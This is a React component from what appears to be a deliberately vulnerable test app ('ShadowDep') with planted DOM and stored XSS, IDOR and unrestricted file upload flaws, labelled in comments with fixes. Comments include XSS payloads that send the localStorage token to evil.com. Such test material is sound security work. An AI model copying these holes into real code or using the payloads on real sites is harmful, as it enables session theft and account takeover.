import React, { useState, useEffect } from 'react';
import api from '../services/api';

/**
 * ProjectDetail Component
 *
 * DAST Findings:
 *   - DOM XSS via URL hash (CWE-79)
 *   - DOM XSS via dangerouslySetInnerHTML with project.description (Stored XSS)
 *   - IDOR — any user can view/edit any project by changing the URL ID (CWE-639)
 *   - Unrestricted file upload — no MIME type validation (CWE-434)
 */
function ProjectDetail({ match }) {
  const [project,   setProject]   = useState(null);
  const [file,      setFile]      = useState(null);
  const [editMode,  setEditMode]  = useState(false);
  const [editData,  setEditData]  = useState({});
  const [uploadMsg, setUploadMsg] = useState('');

  // Extract project ID from URL — sequential integers enable IDOR enumeration
  const projectId = match?.params?.id || window.location.pathname.split('/').pop();

  useEffect(() => {
    fetchProject();

    // ════════════════════════════════════════════════════════════
    // DOM XSS: URL hash content injected unescaped into the DOM
    // Test: /project/1#<img src=x onerror=alert(document.cookie)>
    // Test: /project/1#<script>fetch('//evil.com/'+btoa(localStorage.getItem('token')))</script>
    // ════════════════════════════════════════════════════════════
    if (window.location.hash) {
      const hashPayload = decodeURIComponent(window.location.hash.slice(1));
      const hashEl = document.getElementById('hash-content');
      if (hashEl) {
        hashEl.innerHTML = hashPayload; // DOM XSS — unescaped injection
      }
    }
  }, [projectId]);

  const fetchProject = async () => {
    try {
      // FIXME: IDOR — fetches ANY project by ID, no ownership check
      // Secure: GET /projects/:id with server-side ownership validation
      const res = await api.get('/api/projects');
      const proj = res.data.find(p => p.id === parseInt(projectId));
      setProject(proj || null);
      if (proj) setEditData({ name: proj.name, description: proj.description, status: proj.status, priority: proj.priority });
    } catch (err) {
      console.error('Failed to fetch project:', err);
    }
  };

  const saveEdit = async () => {
    try {
      // FIXME: IDOR — updates any project by ID without ownership check
      await api.put(`/projects/${projectId}`, editData);
      setEditMode(false);
      fetchProject();
    } catch (err) {
      console.error(err);
    }
  };

  const uploadFile = async (e) => {
    e.preventDefault();
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);

    try {
      // FIXME: No client-side file type validation either
      // .php, .sh, .exe, .html — all accepted
      const res = await api.post('/projects/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      });
      // DOM XSS: server response injected into notification
      setUploadMsg(
        `✅ Uploaded: <a href="${res.data.path}" target="_blank" style="color:#818cf8">${res.data.path}</a> ` +
        `(${(res.data.size / 1024).toFixed(1)} KB)`
      );
    } catch (err) {
      setUploadMsg('❌ Upload failed: ' + (err.response?.data?.error || err.message));
    }
  };

  const s = {
    page:      { minHeight: '100vh', background: '#0f172a', fontFamily: "'Segoe UI',Arial,sans-serif" },
    navbar:    { background: 'rgba(30,41,59,0.95)', borderBottom: '1px solid rgba(255,255,255,0.08)', padding: '0 32px', height: 64, display: 'flex', alignItems: 'center', justifyContent: 'space-between' },
    brand:     { fontSize: 20, fontWeight: 700, color: '#818cf8', textDecoration: 'none' },
    container: { maxWidth: 860, margin: '40px auto', padding: '0 24px' },
    card:      { background: 'rgba(30,41,59,0.8)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 16, padding: 36, marginBottom: 24 },
    h1:        { color: '#e2e8f0', fontSize: 26, fontWeight: 700, marginBottom: 16 },
    input:     { width: '100%', padding: '10px 14px', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 8, color: '#e2e8f0', fontSize: 14, outline: 'none', marginBottom: 12, boxSizing: 'border-box' },
    textarea:  { width: '100%', padding: '10px 14px', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 8, color: '#e2e8f0', fontSize: 14, outline: 'none', marginBottom: 12, boxSizing: 'border-box', minHeight: 100, fontFamily: 'inherit' },
    btnPrimary:{ padding: '10px 20px', background: 'linear-gradient(135deg,#6366f1,#8b5cf6)', color: 'white', border: 'none', borderRadius: 8, cursor: 'pointer', fontSize: 14, fontWeight: 600, marginRight: 8 },
    btnSecondary:{ padding: '10px 20px', background: 'rgba(255,255,255,0.1)', color: '#e2e8f0', border: 'none', borderRadius: 8, cursor: 'pointer', fontSize: 14, marginRight: 8 },
    btnDanger: { padding: '10px 20px', background: '#ef4444', color: 'white', border: 'none', borderRadius: 8, cursor: 'pointer', fontSize: 14 },
    sectionTitle:{ color: '#64748b', fontSize: 12, textTransform: 'uppercase', letterSpacing: '0.05em', fontWeight: 600, marginBottom: 12 },
    desc:      { color: '#cbd5e1', lineHeight: 1.7, padding: 20, background: 'rgba(0,0,0,0.2)', borderRadius: 8, borderLeft: '3px solid #6366f1', marginBottom: 24 },
  };

  if (!project) {
    return (
      <div style={s.page}>
        <nav style={s.navbar}>
          <a href="/dashboard" style={s.brand}>🌑 ShadowDep</a>
        </nav>
        <div style={{ ...s.container, textAlign: 'center', paddingTop: 80 }}>
          <p style={{ color: '#94a3b8', fontSize: 48, marginBottom: 16 }}>🔍</p>
          <p style={{ color: '#94a3b8' }}>Project #{projectId} not found (or try another ID for IDOR)</p>
          <div style={{ display: 'flex', justifyContent: 'center', gap: 12, marginTop: 24 }}>
            <a href={`/project/${parseInt(projectId) - 1}`} style={{ color: '#818cf8' }}>← Project #{parseInt(projectId) - 1}</a>
            <a href={`/project/${parseInt(projectId) + 1}`} style={{ color: '#818cf8' }}>Project #{parseInt(projectId) + 1} →</a>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={s.page}>
      <nav style={s.navbar}>
        <a href="/dashboard" style={s.brand}>🌑 ShadowDep</a>
        <div style={{ display: 'flex', gap: 16, alignItems: 'center' }}>
          <a href={`/project/${parseInt(projectId) - 1}`} style={{ color: '#94a3b8', fontSize: 13 }}>← Prev</a>
          <span style={{ color: '#475569', fontSize: 13 }}>ID #{projectId}</span>
          <a href={`/project/${parseInt(projectId) + 1}`} style={{ color: '#94a3b8', fontSize: 13 }}>Next →</a>
        </div>
      </nav>

      {/* DOM XSS injection target from URL hash */}
      <div id="hash-content" style={{ padding: '8px 32px', minHeight: 8 }}></div>

      <div style={s.container}>
        <div style={s.card}>
          {editMode ? (
            <>
              <p style={s.sectionTitle}>Editing Project #{projectId}</p>
              <input style={s.input} placeholder="Name" value={editData.name || ''}
                onChange={e => setEditData({ ...editData, name: e.target.value })} />
              <textarea style={s.textarea} placeholder="Description (HTML/JS allowed — Stored XSS)"
                value={editData.description || ''}
                onChange={e => setEditData({ ...editData, description: e.target.value })} />
              <select style={{ ...s.input }} value={editData.status || 'active'}
                onChange={e => setEditData({ ...editData, status: e.target.value })}>
                <option value="active">Active</option><option value="pending">Pending</option><option value="closed">Closed</option>
              </select>
              <div style={{ display: 'flex', gap: 8 }}>
                <button style={s.btnPrimary} onClick={saveEdit}>Save (IDOR)</button>
                <button style={s.btnSecondary} onClick={() => setEditMode(false)}>Cancel</button>
              </div>
            </>
          ) : (
            <>
              <h1 style={s.h1}>{project.name}</h1>
              <div style={{ display: 'flex', gap: 12, marginBottom: 20, flexWrap: 'wrap' }}>
                <span style={{ padding: '4px 12px', borderRadius: 20, fontSize: 12, background: 'rgba(16,185,129,0.15)', color: '#10b981' }}>
                  {project.status}
                </span>
                <span style={{ padding: '4px 12px', borderRadius: 20, fontSize: 12, background: 'rgba(239,68,68,0.15)', color: '#ef4444' }}>
                  {project.priority}
                </span>
                <span style={{ fontSize: 12, color: '#475569' }}>Owner UID: {project.user_id}</span>
                <span style={{ fontSize: 12, color: '#475569' }}>Created: {new Date(project.created_at).toLocaleDateString()}</span>
              </div>

              <p style={s.sectionTitle}>Description</p>
              {/*
                STORED + DOM XSS: dangerouslySetInnerHTML with API-returned description.
                If project description contains: <script>alert(1)</script>
                or: <img src=x onerror="fetch('//evil.com/'+localStorage.getItem('token'))">
                it will execute here.
                FIXME: Sanitize with DOMPurify.sanitize(project.description)
              */}
              <div
                style={s.desc}
                dangerouslySetInnerHTML={{ __html: project.description }}
              />

              <div style={{ display: 'flex', gap: 8 }}>
                <button style={s.btnPrimary} onClick={() => setEditMode(true)}>✏ Edit</button>
                <a href="/dashboard" style={{ ...s.btnSecondary, textDecoration: 'none' }}>← Back</a>
              </div>
            </>
          )}
        </div>

        {/* ─── File Upload ─────────────────────────────────────── */}
        <div style={s.card}>
          <p style={s.sectionTitle}>📎 Upload Attachment</p>
          <p style={{ color: '#475569', fontSize: 12, marginBottom: 16 }}>
            ⚠ No file type restriction — .php, .sh, .exe, .html all accepted.
            Files stored in web-accessible /uploads/ with directory listing enabled.
          </p>
          <form onSubmit={uploadFile} style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
            <input
              type="file"
              onChange={e => setFile(e.target.files[0])}
              style={{ color: '#94a3b8', fontSize: 13 }}
              /* No accept attribute — no client-side type restriction */
            />
            <button type="submit" style={s.btnPrimary}>Upload</button>
          </form>
          {uploadMsg && (
            /* DOM XSS: uploadMsg contains HTML from server response */
            <div
              style={{ marginTop: 12, color: '#94a3b8', fontSize: 13 }}
              dangerouslySetInnerHTML={{ __html: uploadMsg }}
            />
          )}
        </div>
      </div>
    </div>
  );
}

export default ProjectDetail;
